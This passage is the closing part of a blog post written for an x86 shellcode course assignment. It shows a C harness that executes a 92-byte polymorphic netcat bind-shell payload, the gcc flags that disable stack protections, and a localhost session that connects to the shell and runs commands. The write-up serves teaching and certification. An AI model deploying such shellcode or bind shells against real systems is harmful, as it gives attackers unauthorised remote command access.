+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">int</span> (<span style="color:#f92672">*</span>ret)() <span style="color:#f92672">=</span> (<span style="color:#66d9ef">int</span>(<span style="color:#f92672">*</span>)())code;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">ret</span>();
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>Compiling with <code>gcc</code> and executing it</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>╭─edu@debian ~/Desktop/slae_x86/assignments/6-Polymorphic-Shellcode/netcat-shellcode-804/poly ‹main●› 
+</span></span><span style="display:flex;"><span>╰─$ gcc -fno-stack-protector -m32 -z execstack -o shellcode shellcode.c
+</span></span><span style="display:flex;"><span>shellcode.c:11:1: warning: <span style="color:#66d9ef">return</span> type defaults to ‘int’ <span style="color:#f92672">[</span>-Wimplicit-int<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span> main<span style="color:#f92672">()</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span> ^~~~
+</span></span><span style="display:flex;"><span>╭─edu@debian ~/Desktop/slae_x86/assignments/6-Polymorphic-Shellcode/netcat-shellcode-804/poly ‹main●› 
+</span></span><span style="display:flex;"><span>╰─$ ./shellcode
+</span></span><span style="display:flex;"><span>Shellcode Length: <span style="color:#ae81ff">92</span>
+</span></span><span style="display:flex;"><span>listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">13377</span> ...
+</span></span><span style="display:flex;"><span>connect to <span style="color:#f92672">[</span>127.0.0.1<span style="color:#f92672">]</span> from localhost <span style="color:#f92672">[</span>127.0.0.1<span style="color:#f92672">]</span> <span style="color:#ae81ff">41344</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>-----------
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>╭─edu@debian ~/Desktop/slae_x86/assignments ‹main●› 
+</span></span><span style="display:flex;"><span>╰─$ nc -nv 127.0.0.1 <span style="color:#ae81ff">13377</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>127.0.0.1<span style="color:#f92672">]</span> <span style="color:#ae81ff">13377</span> <span style="color:#f92672">(</span>?<span style="color:#f92672">)</span> open
+</span></span><span style="display:flex;"><span>id
+</span></span><span style="display:flex;"><span>uid<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>edu<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>edu<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>edu<span style="color:#f92672">)</span>,24<span style="color:#f92672">(</span>cdrom<span style="color:#f92672">)</span>,25<span style="color:#f92672">(</span>floppy<span style="color:#f92672">)</span>,27<span style="color:#f92672">(</span>sudo<span style="color:#f92672">)</span>,29<span style="color:#f92672">(</span>audio<span style="color:#f92672">)</span>,30<span style="color:#f92672">(</span>dip<span style="color:#f92672">)</span>,44<span style="color:#f92672">(</span>video<span style="color:#f92672">)</span>,46<span style="color:#f92672">(</span>plugdev<span style="color:#f92672">)</span>,109<span style="color:#f92672">(</span>netdev<span style="color:#f92672">)</span>,111<span style="color:#f92672">(</span>bluetooth<span style="color:#f92672">)</span>,115<span style="color:#f92672">(</span>lpadmin<span style="color:#f92672">)</span>,116<span style="color:#f92672">(</span>scanner<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>ls
+</span></span><span style="display:flex;"><span>poly_netcat
+</span></span><span style="display:flex;"><span>poly_netcat.nasm
+</span></span><span style="display:flex;"><span>poly_netcat.o
+</span></span><span style="display:flex;"><span>shellcode
+</span></span><span style="display:flex;"><span>shellcode.c
+</span></span></code></pre></div><p><strong>Size: 92 bytes</strong></p>
+<p>After some tuning we have a 92-byte polymorphic shellcode. An increase of 28 bytes in size which corresponds to <code>43.75%</code>.</p>
+<h4 id="a-curious-note">A curious Note<a hidden class="anchor" aria-hidden="true" href="#a-curious-note">#</a></h4>
+<p>After put to work this shellcode I checked how <code>shikata_ga_nai</code> encodes shellcode.</p>
+<p><img loading="lazy" src="/slae32/6/shikata_ga_nai.png#center" alt="shikata_ga_nai"  title="shikata_ga_nai"  />
+</p>
+<p>It appars to have some similarities to what have done :)</p>
+<hr>
+<p>This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification: <a href="http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/">http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/</a></p>
+<p><code>Student ID: PA-31319</code></p>
+<p>All the source code files are available on GitHub at <a href="https://github.com/0xnibbles/slae_x86">https://github.com/0xnibbles/slae_x86</a></p>
+<hr>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+      <li><a href="https://0xnibbles.github.io/tags/slae32/">slae32</a></li>
+    </ul>
+<nav class="paginav">
+  <a class="next" href="https://0xnibbles.github.io/posts/slae_32_assignment_5/">
+    <span class="title">Next »</span>
+    <br>
+    <span>SLAE32 Assignment 5 - Msfvenom Shellcode Analysis</span>
+  </a>
+</nav>
+
+
+<div class="share-buttons">
+    <a target="_blank" rel="noopener noreferrer" aria-label="share SLAE32 Assignment 6 - Polymorphic Shellcode on twitter"
+        href="https://twitter.com/intent/tweet/?text=SLAE32%20Assignment%206%20-%20Polymorphic%20Shellcode&amp;url=https%3a%2f%2f0xnibbles.github.io%2fposts%2fslae_32_assignment_6%2f&amp;hashtags=slae32">
+        <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve" height="30px" width="30px" fill="currentColor">
+            <path
+                d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-386.892,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Zm-253.927,424.544c135.939,0 210.268,-112.643 210.268,-210.268c0,-3.218 0,-6.437 -0.153,-9.502c14.406,-10.421 26.973,-23.448 36.935,-38.314c-13.18,5.824 -27.433,9.809 -42.452,11.648c15.326,-9.196 26.973,-23.602 32.49,-40.92c-14.252,8.429 -30.038,14.56 -46.896,17.931c-13.487,-14.406 -32.644,-23.295 -53.946,-23.295c-40.767,0 -73.87,33.104 -73.87,73.87c0,5.824 0.613,11.494 1.992,16.858c-61.456,-3.065 -115.862,-32.49 -152.337,-77.241c-6.284,10.881 -9.962,23.601 -9.962,37.088c0,25.594 13.027,48.276 32.95,61.456c-12.107,-0.307 -23.448,-3.678 -33.41,-9.196l0,0.92c0,35.862 25.441,65.594 59.311,72.49c-6.13,1.686 -12.72,2.606 -19.464,2.606c-4.751,0 -9.348,-0.46 -13.946,-1.38c9.349,29.426 36.628,50.728 68.965,51.341c-25.287,19.771 -57.164,31.571 -91.8,31.571c-5.977,0 -11.801,-0.306 -17.625,-1.073c32.337,21.15 71.264,33.41 112.95,33.41Z" />
+        </svg>
+    </a>
+    <a target="_blank" rel="noopener noreferrer" aria-label="share SLAE32 Assignment 6 - Polymorphic Shellcode on linkedin"
+        href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3a%2f%2f0xnibbles.github.io%2fposts%2fslae_32_assignment_6%2f&amp;title=SLAE32%20Assignment%206%20-%20Polymorphic%20Shellcode&amp;summary=SLAE32%20Assignment%206%20-%20Polymorphic%20Shellcode&amp;source=https%3a%2f%2f0xnibbles.github.io%2fposts%2fslae_32_assignment_6%2f">
+        <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve" height="30px" width="30px" fill="currentColor">
+            <path
+                d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-386.892,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Zm-288.985,423.278l0,-225.717l-75.04,0l0,225.717l75.04,0Zm270.539,0l0,-129.439c0,-69.333 -37.018,-101.586 -86.381,-101.586c-39.804,0 -57.634,21.891 -67.617,37.266l0,-31.958l-75.021,0c0.995,21.181 0,225.717 0,225.717l75.02,0l0,-126.056c0,-6.748 0.486,-13.492 2.474,-18.315c5.414,-13.475 17.767,-27.434 38.494,-27.434c27.135,0 38.007,20.707 38.007,51.037l0,120.768l75.024,0Zm-307.552,-334.556c-25.674,0 -42.448,16.879 -42.448,39.002c0,21.658 16.264,39.002 41.455,39.002l0.484,0c26.165,0 42.452,-17.344 42.452,-39.002c-0.485,-22.092 -16.241,-38.954 -41.943,-39.002Z" />
+        </svg>
+    </a>
+</div>
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+    <span>&copy; 2022 <a href="https://0xnibbles.github.io/">nibbles</a></span>
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu')
+    if (menu) {
+        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        if (document.body.className.includes("dark")) {
+            document.body.classList.remove('dark');
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            document.body.classList.add('dark');
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+<script>
+    document.querySelectorAll('pre > code').forEach((codeblock) => {
+        const container = codeblock.parentNode.parentNode;
+
+        const copybutton = document.createElement('button');
+        copybutton.classList.add('copy-code');
+        copybutton.innerHTML = 'copy';
+
+        function copyingDone() {
+            copybutton.innerHTML = 'copied!';
+            setTimeout(() => {
+                copybutton.innerHTML = 'copy';
+            }, 2000);
+        }
+
+        copybutton.addEventListener('click', (cb) => {
+            if ('clipboard' in navigator) {
+                navigator.clipboard.writeText(codeblock.textContent);
+                copyingDone();
+                return;
+            }
+
+            const range = document.createRange();
+            range.selectNodeContents(codeblock);
+            const selection = window.getSelection();
+            selection.removeAllRanges();
+            selection.addRange(range);
+            try {
+                document.execCommand('copy');
+                copyingDone();
+            } catch (e) { };
+            selection.removeRange(range);
+        });
+
+        if (container.classList.contains("highlight")) {
+            container.appendChild(copybutton);
+        } else if (container.parentNode.firstChild == container) {
+            
+        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
+            
+            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
+        } else {
+            
+            codeblock.parentNode.appendChild(copybutton);
+        }
+    });
+</script>
+</body>
+
+</html>
